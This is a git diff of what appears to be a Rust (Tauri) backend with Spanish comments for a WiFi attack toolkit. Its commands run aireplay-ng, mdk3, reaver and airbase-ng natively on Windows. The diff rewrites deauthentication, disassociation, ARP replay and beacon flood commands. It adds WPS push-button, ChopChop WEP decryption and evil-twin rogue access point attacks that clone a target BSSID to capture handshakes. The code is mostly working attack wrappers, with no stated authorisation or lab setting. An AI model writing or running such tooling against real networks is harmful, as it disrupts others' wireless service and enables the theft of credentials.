@@ -224,23 +224,28 @@ pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 6 — SCAN AIRODUMP-STYLE  (airodump-ng real via WSL2)
+// COMANDO 6 — SCAN AIRODUMP-STYLE  (airodump-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
-/// Escanea redes con airodump-ng en WSL2 por la duración indicada.
-/// Usa --write-interval 1000 paraa CSV actualizado cada segundo.
+/// Escanea redes con airodump-ng (Windows nativo) por la duracion indicada.
+/// Usa --write-interval 1000 para CSV actualizado cada segundo.
 /// Devuelve el stdout de airodump-ng para que el frontend lo parsee.
 #[command]
-pub async fn scan_airodump(_app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> CmdResponse {
-    let ch    = channel_filter.unwrap_or(0);
-    let dur   = duration_secs.unwrap_or(60);
-    let mut cmd = format!("airodump-ng --write-interval 1000 --output-format csv wlan0mon");
+pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> CmdResponse {
+    let prog = tool_path("AIRODUMP_PATH", "airodump-ng.exe");
+    let ch   = channel_filter.unwrap_or(0);
+    let dur  = duration_secs.unwrap_or(60);
 
-    if ch > 0 { cmd.push_str(&format!(" --channel {}", ch)); }
-    if let Some(ref b) = bssid_filter { cmd.push_str(&format!(" --bssid {}", b)); }
-    cmd.push_str(&format!(" & sleep {}; kill $!", dur));
+    let mut args = vec![
+        "--write-interval".into(), "1000".into(),
+        "--output-format".into(), "csv".into(),
+    ];
+    if ch > 0 { args.push("--channel".into()); args.push(ch.to_string()); }
+    if let Some(ref b) = bssid_filter { args.push("--bssid".into()); args.push(b.clone()); }
+    args.push("wlan0mon".into());
 
-    eprintln!("[scan_airodump] ejecutando en WSL2: {}", cmd);
-    crate::wifi_adapter::wsl2_run(_app, cmd).await
+    let r = run_bin(&app, prog.to_str().unwrap_or("airodump-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nCanal: {}  Duracion: {}s\n\n{}", prog.display(), if ch > 0 { ch.to_string() } else { "todos".into() }, dur, r.output);
+    CmdResponse { success: r.success, output: wrap("AIRODUMP Scan", &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -252,47 +257,57 @@ pub async fn scan_airodump(_app: AppHandle, bssid_filter: Option<String>, channe
 /// - address=ff:ff:ff:ff:ff:ff → broadcast (inyecta todo dispositivo)
 /// - address=<target-mac>     → unicast a un equipo específico
 /// - target_bssid es el BSSID del AP objetivo
-/// Si se omite `count`, aireplay-ng envía paquetes hasta Ctrl+C.
+/// Si se omite `count`, aireplay-ng envia paquetes hasta Ctrl+C.
 #[command]
-pub async fn arp_replay_inject(_app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
+pub async fn arp_replay_inject(app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
     let iface    = iface.unwrap_or_else(|| "wlan0mon".into());
     let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
-    let cmd  = format!("aireplay-ng --arpreply -b {} -h {} {}", target_bssid, addr, iface);
 
-    eprintln!("[arpreply] ejecutando en WSL2: {}", cmd);
-    crate::wifi_adapter::wsl2_run(_app, cmd).await
+    let args = vec![
+        "--arpreply".into(),
+        "-b".into(), target_bssid.clone(),
+        "-h".into(), addr.clone(),
+        iface.clone(),
+    ];
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC fake: {}\nInterface: {}\n\n{}", prog.display(), target_bssid, addr, iface, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("ARP Replay \u{00B7} {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 15 — BEACON FLOOD  (mdk3 via WSL2)
 // ═══════════════════════════════════════════════════════════════════════════════
 /// Inunda el aire con beacons falsos de un AP virtual.
-/// Crea la ilusión de un AP adicional en el espectro WiFi.
+/// Crea la ilusin de un AP adicional en el espectro WiFi.
 ///
 /// - essid: nombre de la red falsa
 /// - bssid: MAC del AP falso (por defecto aleatoria)
 /// - channel: canal a usar (por defecto 1)
-/// - beacon_count: nº de beacons a inyectar antes de parar (0 = indefinido)
+/// - beacon_count: numero de beacons a inyectar antes de parar (0 = indefinido)
 #[command]
-pub async fn beacon_flood(_app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
-    let bssid     = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
-    let ch        = channel.unwrap_or(1).to_string();
-    let cnt       = beacon_count.unwrap_or(50);
-    let mut cmd   = format!("mdk3 {} b -c {} -n '{}' -s {}", iface_placeholder(), ch, essid, cnt);
+pub async fn beacon_flood(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
+    let prog  = tool_path("MDK3_PATH", "mdk3.exe");
+    let bssid = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let ch    = channel.unwrap_or(1).to_string();
+    let cnt   = beacon_count.unwrap_or(50);
 
-    cmd.push_str(&format!(" -a {}", bssid));
+    let mut args = vec![
+        "wlan0mon".into(), "b".into(),
+        "-c".into(), ch.clone(),
+        "-n".into(), essid.clone(),
+        "-s".into(), cnt.to_string(),
+    ];
+    args.push("-a".into()); args.push(bssid.clone());
 
-    eprintln!("[beacon_flood] ejecutando en WSL2: {}", cmd);
-    crate::wifi_adapter::wsl2_run(_app, cmd).await
+    let r = run_bin(&app, prog.to_str().unwrap_or("mdk3.exe"), &args).await;
+    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nBeacons: {}\n\n{}", prog.display(), essid, bssid, ch, cnt, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Beacon Flood \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// HELPER — placeholder de interface WSL
-// ═══════════════════════════════════════════════════════════════════════════════
-fn iface_placeholder() -> &'static str {
-    "wlan0mon"
-}
-
+// HELPER
 // ═══════════════════════════════════════════════════════════════════════════════
 // COMANDO 7 — ESTADO DE INTERFAZ WiFi
 // ═══════════════════════════════════════════════════════════════════════════════
@@ -422,37 +437,144 @@ pub async fn crack_handshake(app: AppHandle, hash_file: String, wordlist: Option
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 12 — DEAUTH INJECTION  (aireplay-ng via WSL2)
+// COMANDO 12 — DEAUTH INJECTION  (aireplay-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
 /// Envía paquetes de desautenticación 802.11 para forzar un re-handshake WPA2.
-/// Requiere WSL2 con aircrack-ng instalado y adaptador en modo monitor.
+/// Requiere adaptador WSL2 y adaptador en modo monitor (aireplay-ng.exe).
 /// Uso: aireplay-ng --deauth <count> -a <BSSID> [-c <client>] <iface>
 #[command]
-pub async fn deauth_inject(_app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
-    let iface  = iface.unwrap_or_else(|| "wlan0mon".into());
-    let cnt    = count.unwrap_or(10).to_string();
-    let mut cmd = format!("aireplay-ng --deauth {} -a {}", cnt, bssid);
-    if let Some(ref c) = client_mac { cmd.push_str(&format!(" -c {}", c)); }
-    cmd.push_str(&format!(" {}", iface));
+pub async fn deauth_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let cnt  = count.unwrap_or(10);
+    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
 
-    println!("[deauth] ejecutando en WSL2: {}", cmd);
-    crate::wifi_adapter::wsl2_run(_app, cmd).await
+    let mut args = vec![
+        "--deauth".into(), cnt.to_string(),
+        "-a".into(), bssid.clone(),
+    ];
+    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
+    args.push(iface_in.clone());
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Deauth \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 13 — DISASSOC INJECTION  (aireplay-ng via WSL2)
+// COMANDO 13 — DISASSOC INJECTION  (aireplay-ng Windows nativo)
 // ═══════════════════════════════════════════════════════════════════════════════
 /// Envía paquetes de desasociación 802.11 (menos intrusivo que deauth).
-/// Requiere WSL2 con aircrack-ng instalado.
+/// Requiere aireplay-ng.exe instalado + adaptador en modo monitor.
 #[command]
-pub async fn disassoc_inject(_app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
-    let iface  = iface.unwrap_or_else(|| "wlan0mon".into());
-    let cnt    = count.unwrap_or(5).to_string();
-    let mut cmd = format!("aireplay-ng --disassociate {} -a {}", cnt, bssid);
-    if let Some(ref c) = client_mac { cmd.push_str(&format!(" -c {}", c)); }
-    cmd.push_str(&format!(" {}", iface));
+pub async fn disassoc_inject(app: AppHandle, bssid: String, client_mac: Option<String>, count: Option<u8>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let cnt  = count.unwrap_or(5);
+    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
 
-    println!("[disassoc] ejecutando en WSL2: {}", cmd);
-    crate::wifi_adapter::wsl2_run(_app, cmd).await
+    let mut args = vec![
+        "--disassociate".into(), cnt.to_string(),
+        "-a".into(), bssid.clone(),
+    ];
+    if let Some(ref c) = client_mac { args.push("-c".into()); args.push(c.clone()); }
+    args.push(iface_in.clone());
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nClientes: {}\nPaquetes: {}\nInterface: {}\n\n{}", prog.display(), bssid, client_mac.as_deref().unwrap_or("broadcast"), cnt, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Disassoc \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 16 — WPS PBC  (reaver-wps push-button mode)
+// ═══════════════════════════════════════════════════════════════════════════════
+/// Ataca WPS Push-Button Configuration (PBC).
+/// Usa reaver-wps en modo -S (pbc-only): espera a que el usuario pulse WPS en el router
+/// o realiza un ataque de fuerza bruta de estado PBC.
+///
+/// -S  activa modo solo-PBC (sin PIN)
+/// -vv verbose
+/// -L lockout de 60s entre reintentos
+#[command]
+pub async fn wps_pbc_attack(app: AppHandle, bssid: String, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("REAVER_PATH", "reaver-wps-fork-t6x.exe");
+    let iface_in  = iface.unwrap_or_else(|| "wlan0".into());
+
+    let args = vec![
+        "-i".into(), iface_in.clone(),
+        "-b".into(), bssid.clone(),
+        "-S".into(),
+        "-vv".into(),
+        "-L".into(),
+    ];
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("reaver-wps-fork-t6x.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nInterface: {}\nModo: WPS PBC (-S)\n\n{}", prog.display(), bssid, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("WPS PBC \u{00B7} {}", bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 17 — CHOPCHOP INJECT  (aireplay-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+/// Ataque ChopChop de aireplay-ng.
+/// Descifra paquetes WEP en tiempo real generando IVs nuevos, sin necesidad de conocer la clave.
+/// El resultado se puede mezclar con Packetforge para crear paquetes de datos inyectables.
+/// Es util para redes WEP legacy y como paso previo al ataque ARP replay.
+///
+/// --arpreplay-mode: arpreplay para WEP
+/// -b:  BSSID objetivo
+/// -h:  direccion MAC origen (falsa)
+/// -F: archivo de salida con paquetes descifrados
+#[command]
+pub async fn chopchop_inject(app: AppHandle, target_bssid: String, source_mac: Option<String>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRPLAY_PATH", "aireplay-ng.exe");
+    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
+    let src_mac   = source_mac.unwrap_or_else(|| "00:11:22:33:44:55".into());
+
+    let out_file = format!("chopchop_{}.xor", target_bssid.replace(':', ""));
+
+    let args = vec![
+        "--chopchop".into(),
+        "-b".into(), target_bssid.clone(),
+        "-h".into(), src_mac.clone(),
+        "-F".into(), out_file.clone(),
+        iface_in.clone(),
+    ];
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("aireplay-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nBSSID: {}\nMAC origen: {}\nInterface: {}\nSalida: {}\n\n{}", prog.display(), target_bssid, src_mac, iface_in, out_file, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("ChopChop \u{00B7} {}", target_bssid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 18 — EVIL TWIN / ROGUE AP  (airbase-ng Windows nativo)
+// ═══════════════════════════════════════════════════════════════════════════════
+/// Crea un AP falso (Evil Twin / Rogue AP) con airbase-ng.
+/// El AP se identifica por el BSSID real a emular. El propio airbase-ng puede
+/// capturar el handshake WPA2 de clientes que se conecten, o redirigir trafico a Internet.
+///
+/// Opciones principales:
+/// -e: ESSID del AP falso
+/// -b: BSSID a clonar
+/// -c: canal
+/// -W: WEP (0=abierta, 1=WEP, 2=WPA, 3=WPA2)
+/// --essid / --bssid / --channel son sinonimos
+#[command]
+pub async fn rogue_ap(app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, iface: Option<String>) -> CmdResponse {
+    let prog = tool_path("AIRBASE_PATH", "airbase-ng.exe");
+    let iface_in  = iface.unwrap_or_else(|| "wlan0mon".into());
+    let bssid_val = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let ch        = channel.unwrap_or(1);
+
+    let args = vec![
+        "--essid".into(), essid.clone(),
+        "-b".into(), bssid_val.clone(),
+        "-c".into(), ch.to_string(),
+        "-W".into(), "2".into(),   // WPA-PSK
+        iface_in.clone(),
+    ];
+
+    let r = run_bin(&app, prog.to_str().unwrap_or("airbase-ng.exe"), &args).await;
+    let body = format!("Binario: {}\nESSID: {}\nBSSID: {}\nCanal: {}\nInterface: {}\n\n{}",
+        prog.display(), essid, bssid_val, ch, iface_in, r.output);
+    CmdResponse { success: r.success, output: wrap(&format!("Rogue AP \u{00B7} {}", essid), &body, r.success), stderr: r.stderr, exit_code: r.exit_code }
 }
 
